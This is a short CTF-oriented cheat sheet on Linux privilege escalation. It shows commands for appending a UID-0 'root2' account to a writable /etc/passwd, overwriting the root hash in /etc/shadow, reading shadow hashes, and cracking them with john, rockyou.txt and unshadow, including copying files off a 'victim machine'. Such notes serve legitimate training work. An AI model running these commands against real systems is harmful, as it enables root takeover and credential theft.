# /etc/shadow & /etc/passwd

in a real life scenario its really uncommon to see /etc/passwd or /etc/shadow files with write access for any user other than root.

the methods shown here are mostly seen in easy or intermediate level CTFs but its still good to know these.

## <mark style="color:red;">Add /etc/passwd new root user</mark>

if we have write permission to /etc/passwd we can add a new root user with password hash and the right format\
\
first we create a hash for our root user password:\
\
`openssl passwd evil`\
`echo "root2:[password hash]:0:0:root:/root:/bin/bash" >> /etc/passwd`

now login using the new root account:

## <mark style="color:red;">Change the /etc/shadow root hash</mark>

if we have write access to /etc/shadow file we can add a new password hash for the root user:

#### `mkpasswd -m sha-512 “new password”`

replace the root hash with this new hash and login:

## <mark style="color:red;">Hash cracking</mark>

if the /etc/shadow is readable copy the root user hash to the local system:

#### `ls -l /etc/shadow` `head -n 1 /etc/shadow`

Crack the password hash using john:

#### `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` `john --format=sha512crypt hash.txt --show`

#### `unshadow /etc/passwd /etc/shadow > hash`

{% hint style="info" %}
**`if the "unshadow" command ins not available on target system just copy the content of both files to your own machine and run unshadow on them or just install the unshadow tool on victim machni using apt. remember the order of files is important when unshadowing. /etc/passwd is always first and then there is /etc/shadow.`**
{% endhint %}
